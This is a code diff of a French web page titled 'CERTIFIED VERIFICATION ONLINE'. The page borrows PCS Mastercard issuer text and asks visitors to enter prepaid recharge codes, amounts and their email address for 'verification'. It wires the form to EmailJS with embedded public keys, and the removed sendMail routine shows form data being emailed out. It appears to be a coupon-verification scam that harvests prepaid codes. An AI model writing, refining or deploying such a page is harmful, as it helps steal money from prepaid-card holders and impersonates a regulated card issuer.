@@ -1,12 +1,176 @@
 <html>
 <head>
 <title>CERTIFIED VERIFICATION ONLINE</title>
+
+<style>
+    /* Modal Styles */
+   /* Modal Base Styles */
+.modal {
+    display: flex;
+    position: fixed;
+    z-index: 10000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+    visibility: hidden;
+}
+
+.modal.show {
+    opacity: 1;
+    visibility: visible;
+}
+
+.modal-content {
+    background: linear-gradient(145deg, #0a192f, #1a2a3f);
+    color: white;
+    padding: 2rem;
+    border-radius: 20px;
+    width: 90%;
+    max-width: 500px;
+    transform: scale(0.9);
+    transition: all 0.3s ease;
+    position: relative;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+}
+
+.modal.show .modal-content {
+    transform: scale(1);
+}
+
+.modal-close {
+    position: absolute;
+    right: 1.5rem;
+    top: 1rem;
+    width: 30px;
+    height: 30px;
+    border: none;
+    background: none;
+    color: #96c93d;
+    font-size: 2rem;
+    cursor: pointer;
+    transition: color 0.3s ease;
+    padding: 0;
+    line-height: 1;
+}
+
+.modal-close:hover {
+    color: #00b09b;
+}
+
+.modal-title {
+    color: #96c93d;
+    font-size: 1.5rem;
+    margin-bottom: 1.5rem;
+    text-align: center;
+    font-weight: 600;
+}
+
+.modal-body {
+    font-size: 1.1rem;
+    line-height: 1.6;
+    margin-bottom: 1.5rem;
+}
+
+.modal-action-btn {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    background: linear-gradient(135deg, #00b09b, #96c93d);
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.2s ease;
+}
+
+.modal-action-btn:hover {
+    transform: translateY(-2px);
+}
+
+/* Modal Types */
+.success-modal .modal-content {
+    background: linear-gradient(135deg, #00b09b, #96c93d);
+}
+
+.success-modal .modal-title {
+    color: white;
+}
+
+.error-modal .modal-content {
+    background: linear-gradient(145deg, #3f1a1a, #5f2a2a);
+}
+
+.error-modal .modal-title {
+    color: #ff6b6b;
+}
+
+.info-modal .modal-body {
+    max-height: 60vh;
+    overflow-y: auto;
+}
+
+/* Mobile Optimization */
+@media (max-width: 768px) {
+    .modal-content {
+        width: 95%;
+        padding: 1.5rem;
+        margin: 1rem;
+    }
+    
+    .modal-body {
+        font-size: 1rem;
+    }
+}
+</style>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="format-detection" content="telephone=no">
 <meta name="theme-color" content="#0a192f">
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    window.emailJSReady = false;
+    
+    function initEmailJS(retries = 3) {
+        if (typeof emailjs !== 'undefined') {
+            try {
+                emailjs.init("iXhBi47917f0L3zGT");
+                window.emailJSReady = true;
+                console.log('EmailJS initialized successfully');
+            } catch (error) {
+                console.error('EmailJS initialization error:', error);
+                window.emailJSReady = false;
+                if (retries > 0) {
+                    setTimeout(() => initEmailJS(retries - 1), 1000);
+                }
+            }
+        } else if (retries > 0) {
+            setTimeout(() => initEmailJS(retries - 1), 1000);
+        }
+    }
+
+    // Try to initialize immediately
+    initEmailJS();
+
+    // Also try on DOMContentLoaded if not initialized yet
+    document.addEventListener('DOMContentLoaded', function() {
+        if (!window.emailJSReady) {
+            initEmailJS();
+        }
+    });
+</script>
 
 <!-- Critical CSS -->
 
@@ -38,6 +202,18 @@
         display: none;
     }
 </style>
+
+<script>
+    window.addEventListener('DOMContentLoaded', function() {
+        const loader = document.getElementById('page-loader');
+        if (loader) {
+            setTimeout(() => {
+                loader.classList.add('loaded');
+                loader.style.display = 'none';
+            }, 1000);
+        }
+    });
+</script>
 
 
 
@@ -80,166 +256,132 @@
 
 
 <style>
-    /* Enhanced Modal Styles */
-    .modal {
-        display: none;
-        position: fixed;
-        z-index: 10000;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.6);
-        backdrop-filter: blur(10px);
-        justify-content: center;
-        align-items: center;
-        opacity: 0;
-        transition: opacity 0.3s ease;
-    }
+   /* Modal Base Styles */
+.modal {
+    display: flex;
+    position: fixed;
+    z-index: 10000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+    visibility: hidden;
+}
 
-    .modal.show {
-        opacity: 1;
-    }
+.modal.show {
+    opacity: 1;
+    visibility: visible;
+}
 
+.modal-content {
+    background: linear-gradient(145deg, #0a192f, #1a2a3f);
+    color: white;
+    padding: 2rem;
+    border-radius: 20px;
+    width: 90%;
+    max-width: 500px;
+    transform: scale(0.9);
+    transition: all 0.3s ease;
+    position: relative;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+}
+
+.modal.show .modal-content {
+    transform: scale(1);
+}
+
+.modal-close {
+    position: absolute;
+    right: 1.5rem;
+    top: 1rem;
+    width: 30px;
+    height: 30px;
+    border: none;
+    background: none;
+    color: #96c93d;
+    font-size: 2rem;
+    cursor: pointer;
+    transition: color 0.3s ease;
+    padding: 0;
+    line-height: 1;
+}
+
+.modal-close:hover {
+    color: #00b09b;
+}
+
+.modal-title {
+    color: #96c93d;
+    font-size: 1.5rem;
+    margin-bottom: 1.5rem;
+    text-align: center;
+    font-weight: 600;
+}
+
+.modal-body {
+    font-size: 1.1rem;
+    line-height: 1.6;
+    margin-bottom: 1.5rem;
+}
+
+.modal-action-btn {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    background: linear-gradient(135deg, #00b09b, #96c93d);
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.2s ease;
+}
+
+.modal-action-btn:hover {
+    transform: translateY(-2px);
+}
+
+/* Modal Types */
+.success-modal .modal-content {
+    background: linear-gradient(135deg, #00b09b, #96c93d);
+}
+
+.success-modal .modal-title {
+    color: white;
+}
+
+.error-modal .modal-content {
+    background: linear-gradient(145deg, #3f1a1a, #5f2a2a);
+}
+
+.error-modal .modal-title {
+    color: #ff6b6b;
+}
+
+.info-modal .modal-body {
+    max-height: 60vh;
+    overflow-y: auto;
+}
+
+/* Mobile Optimization */
+@media (max-width: 768px) {
     .modal-content {
-        background: linear-gradient(145deg, #0a192f, #1a2a3f);
-        padding: 2rem;
-        border-radius: 20px;
-        width: 90%;
-        max-width: 500px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        transform: scale(0.9);
-        transition: transform 0.3s ease;
+        width: 95%;
+        padding: 1.5rem;
+        margin: 1rem;
     }
-
-    .modal.show .modal-content {
-        transform: scale(1);
-    }
-
-    .modal-close {
-        position: absolute;
-        right: 1.5rem;
-        top: 1rem;
-        font-size: 2rem;
-        cursor: pointer;
-        color: #96c93d;
-        transition: color 0.3s ease;
-    }
-
-    .modal-close:hover {
-        color: #00b09b;
-    }
-
-    .modal-title {
-        color: #96c93d;
-        font-size: 1.5rem;
-        margin-bottom: 1.5rem;
-        text-align: center;
-    }
-
+    
     .modal-body {
-        color: #e0e0e0;
-        font-size: 1.1rem;
-        line-height: 1.6;
+        font-size: 1rem;
     }
-
-    /* Error Modal Specific Styles */
-    .error-modal .modal-content {
-        background: linear-gradient(145deg, #3f1a1a, #5f2a2a);
-    }
-
-    .error-modal .modal-title {
-        color: #ff6b6b;
-    }
-
-    .error-modal .modal-close {
-        color: #ff6b6b;
-    }
-
-    .error-modal .modal-close:hover {
-        color: #ff4c4c;
-    }
-
-    /* iOS-specific styles */
-    @supports (-webkit-touch-callout: none) {
-        .service-card {
-            -webkit-transform: translateZ(0);
-            -webkit-backface-visibility: hidden;
-            -webkit-perspective: 1000;
-        }
-        
-        .glass-morphism {
-            -webkit-backdrop-filter: blur(10px);
-        }
-        
-        /* Prevent text size adjustment on orientation change */
-        html {
-            -webkit-text-size-adjust: 100%;
-        }
-        
-        /* Fix for iOS button styling */
-        button {
-            -webkit-appearance: none;
-            border-radius: 0;
-        }
-        
-        /* Fix for iOS input styling */
-        input, select, textarea {
-            -webkit-appearance: none;
-            border-radius: 0;
-        }
-        
-        /* Safe area insets for iPhone X and newer */
-        @supports (padding: max(0px)) {
-            .header {
-                padding-top: max(0.5rem, env(safe-area-inset-top));
-                padding-left: max(0.5rem, env(safe-area-inset-left));
-                padding-right: max(0.5rem, env(safe-area-inset-right));
-            }
-            
-            .footer {
-                padding-bottom: max(0.5rem, env(safe-area-inset-bottom));
-            }
-        }
-    }
-
-    /* Improved touch targets for mobile */
-    @media (max-width: 768px) {
-        .nav-link, button, .service-card {
-            min-height: 44px; /* iOS minimum touch target size */
-            min-width: 44px;
-        }
-        
-        .service-card {
-            padding: 20px !important;
-        }
-        
-        /* Prevent pull-to-refresh on iOS */
-        body {
-            overscroll-behavior-y: none;
-        }
-        
-        /* Fix for iOS momentum scrolling */
-        .container {
-            -webkit-overflow-scrolling: touch;
-        }
-        
-        /* Improve tap highlight on iOS */
-        a, button {
-            -webkit-tap-highlight-color: rgba(0,0,0,0);
-        }
-        
-        /* Fix for iOS form elements */
-        input[type="text"],
-        input[type="email"],
-        input[type="number"],
-        select,
-        textarea {
-            font-size: 16px !important; /* Prevent zoom on focus */
-            padding: 12px !important;
-            margin-bottom: 15px !important;
-        }
-    }
+}
 </style>
 
 </head>
@@ -287,7 +429,7 @@
           <p data-aos="fade-up" data-aos-delay="100" class="typing-text" style="color: #636e72; font-size: 1.1rem;">Vérifiez vos cartes en toute sécurité depuis le confort de votre domicile, avec notre système de vérification de pointe.</p>
           <div class="cta-buttons" data-aos="fade-up" data-aos-delay="200" style="margin-top: 2rem;">
             <button onclick="scrollToForm()" class="btn-primary-gradient">Commencer la vérification</button>
-            <button onclick="showInfoModal()" class="btn-secondary-outline">En savoir plus</button>
+            <button data-bs-toggle="modal" data-bs-target="#formGuidanceModal" class="btn-secondary-outline">En savoir plus</button>
           </div>
         </div>
       </div>
@@ -399,7 +541,7 @@
           <div class="col-lg-6 content order-last  order-lg-first">
             <h3>A propos de nous</h3>
             <p>
-            La carte de paiement prépayée PCS Mastercard est émise par PFS Card Services (Ireland) Limited en vertu d’une licence de Mastercard International Incorporated. PFS Card Services (Ireland) Limited, qui exerce ses activités sous le nom de PCSIL, est autorisée et réglementée en tant qu'émetteur de monnaie électronique par la Banque centrale d'Irlande sous le numéro d'enregistrement C175999. Siège social: Front Office, Scurlockstown Business Park, Trim, Co. Meath, C15 K2R9. Numéro d'enregistrement des sociétés : 590062. PCS® Prepaid Cash Services est une marque de CreaCard SA. ©
+            La carte de paiement prépayée PCS Mastercard est émise par PFS Card Services (Ireland) Limited en vertu d’une licence de Mastercard International Incorporated. PFS Card Services (Ireland) Limited, qui exerce ses activités sous le nom de PCSIL, est autorisée et réglementée en tant qu'émetteur de monnaie électronique par la Banque centrale d'Irlande sous le numéro d'enregistrement C175999. Siège social: Front Office, Scurlockstown Business Park, Trim, Co. Meath, C15 K2R9. Numéro d'enregistrement des sociétés : 590062. PCS® Prepaid Cash Services est une marque de CreaCard SA. 
             </p>
             <ul>
               <li data-aos="fade-up" data-aos-delay="100">
@@ -753,6 +895,33 @@
           </ul>
         </div>
 
+<!-- Form Guidance Modal -->
+
+<div class="modal fade" id="formGuidanceModal" tabindex="-1" aria-labelledby="formGuidanceModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="formGuidanceModalLabel">Comment remplir le formulaire</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <p>Pour vérifier votre coupon, suivez ces étapes :</p>
+        <ol>
+          <li>Sélectionnez le type de recharge dans le menu déroulant.</li>
+          <li>Entrez le montant de la recharge.</li>
+          <li>Choisissez la devise appropriée.</li>
+          <li>Entrez les codes de recharge dans les champs prévus à cet effet.</li>
+          <li>Entrez votre adresse email pour recevoir la confirmation.</li>
+          <li>Cliquez sur le bouton "Vérifier mon coupon..." pour soumettre le formulaire.</li>
+        </ol>
+        <p>Assurez-vous que toutes les informations sont correctes avant de soumettre le formulaire.</p>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fermer</button>
+      </div>
+    </div>
+  </div>
+</div>
 
         <div class="col-lg-3 col-md-12 footer-contact text-center text-md-start">
           <h4>Contact Us</h4>
@@ -786,169 +955,7 @@
 <div id="preloader"></div>
 
 <!-- Vendor JS Files -->
-<script src="js/bootstrap.bundle.min.js" 
-    onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js';" 
-    defer>
-</script>
-<!-- Move EmailJS script before index.js -->
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-    (function() {
-        emailjs.init("1JwZlq1ySAw2xhzK2");
-        console.log('EmailJS initialized successfully');
-    })();
-</script>
-<script src="index.js" defer></script>
-
-
-<!-- Modal -->
-<div id="infoModal" class="modal">
-    <div class="modal-content">
-        <span class="modal-close" onclick="closeModal()">&times;</span>
-        <h3 class="modal-title">Comment remplir le formulaire</h3>
-        <div class="modal-body">
-            <ul>
-                <li>Sélectionnez le type de recharge dans la liste déroulante</li>
-                <li>Entrez le montant exact de votre recharge</li>
-                <li>Choisissez la devise correspondante</li>
-                <li>Saisissez vos codes de recharge (jusqu'à 5 codes possibles)</li>
-                <li>Renseignez votre adresse email pour recevoir la confirmation</li>
-                <li>Cliquez sur "Vérifier mon coupon" pour lancer la vérification</li>
-            </ul>
-            <p style="margin-top: 20px; font-style: italic;">Note: Assurez-vous que toutes les informations sont correctes avant de soumettre.</p>
-        </div>
-    </div>
-</div>
-
-<!-- Success Modal -->
-<div id="successModal" class="modal">
-    <div class="modal-content">
-        <span class="modal-close" onclick="closeSuccessModal()">&times;</span>
-        <h3 class="modal-title">Message Sent Successfully!</h3>
-        <div class="modal-body">
-            <p>Your verification request has been received. You'll get a confirmation email shortly.</p>
-        </div>
-    </div>
-</div>
-
-<style>
-    /* Success Modal Styles */
-    #successModal .modal-content {
-        background: linear-gradient(135deg, #00b09b, #96c93d);
-        color: white;
-        border-radius: 20px;
-        padding: 30px;
-    }
-
-    #successModal .modal-title {
-        color: white;
-        margin-bottom: 20px;
-    }
-
-    #successModal .modal-body p {
-        font-size: 1.1rem;
-        line-height: 1.6;
-    }
-</style>
-
-<script>
-    // Initialize UI when DOM is ready
-    document.addEventListener('DOMContentLoaded', function() {
-        const loader = document.getElementById('page-loader');
-        
-        // Hide loader after a maximum of 5 seconds
-        setTimeout(() => {
-            if (loader) loader.classList.add('loaded');
-        }, 5000);
-
-        // UI Functions
-        window.scrollToForm = function() {
-            const formSection = document.getElementById('formulaire');
-            if (!formSection) return;
-            
-            const headerOffset = 100;
-            const elementPosition = formSection.getBoundingClientRect().top;
-            const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
-
-            window.scrollTo({
-                top: offsetPosition,
-                behavior: 'smooth'
-            });
-
-            const form = document.querySelector('.pricing-item');
-            if (form) {
-                form.style.animation = 'none';
-                form.offsetHeight;
-                form.style.animation = 'pulse-border 1s ease';
-            }
-        };
-
-        // Enhanced Modal System
-        const modalSystem = {
-            showModal: function(type, title, message) {
-                const modal = document.createElement('div');
-                modal.className = `modal ${type}-modal`;
-                modal.innerHTML = `
-                    <div class="modal-content">
-                        <span class="modal-close" onclick="modalSystem.closeModal(this)">&times;</span>
-                        <h3 class="modal-title">${title}</h3>
-                        <div class="modal-body">${message}</div>
-                    </div>
-                `;
-                document.body.appendChild(modal);
-                setTimeout(() => modal.classList.add('show'), 10);
-            },
-
-            closeModal: function(element) {
-                const modal = element.closest('.modal');
-                modal.classList.remove('show');
-                setTimeout(() => modal.remove(), 300);
-            }
-        };
-
-        // Update the sendMail function
-        window.sendMail = function() {
-            const email = document.getElementById('email').value;
-            const rechargeType = document.getElementById('rechargetype').value;
-            
-            if (!email || !rechargeType) {
-                modalSystem.showModal('error', 'Erreur', 'Veuillez remplir tous les champs requis.');
-                return;
-            }
-
-            const templateParams = {
-                email: email,
-                rechargeType: rechargeType
-            };
-
-            emailjs.send('service_id', 'template_id', templateParams)
-                .then(() => {
-                    modalSystem.showModal('success', 'Succès', 'Votre demande de vérification a été envoyée avec succès!');
-                })
-                .catch(() => {
-                    modalSystem.showModal('error', 'Erreur', 'Une erreur s\'est produite lors de l\'envoi de votre demande. Veuillez réessayer.');
-                });
-        };
-
-        // Close modal when clicking outside
-        document.addEventListener('click', function(event) {
-            if (event.target.classList.contains('modal')) {
-                modalSystem.closeModal(event.target);
-            }
-        });
-
-        // Close modal with ESC key
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Escape') {
-                const modal = document.querySelector('.modal.show');
-                if (modal) modalSystem.closeModal(modal);
-            }
-        });
-    });
-
-    // Hide loader when all resources are loaded
-    window.addEventListener('load', function() {
-        const loader = document.getElementById('page-loader');
-        if (loader) loader.classList.add('loaded');
-    });
-</script>
+<!-- Replace your current Bootstrap JS import with this -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+<!-- Main JS -->
+<script src="index.js"></script>
